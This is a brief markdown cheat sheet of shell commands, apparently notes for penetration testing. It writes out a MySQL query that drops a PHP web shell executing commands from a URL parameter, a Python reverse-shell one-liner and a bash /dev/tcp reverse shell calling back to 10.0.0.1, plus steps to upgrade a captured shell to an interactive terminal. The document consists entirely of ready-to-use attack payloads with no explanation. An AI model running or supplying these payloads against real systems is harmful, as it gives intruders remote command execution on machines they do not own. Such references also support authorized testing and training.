# Shells

## Webshell

### Mysql

```text
SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
```

## Python

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Reverse shell bash

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```



## Get better shell

```text
python -c 'import pty; pty.spawn("/bin/sh")'
ctrl + z
stty raw -echo
fg
reset
```

\`\`
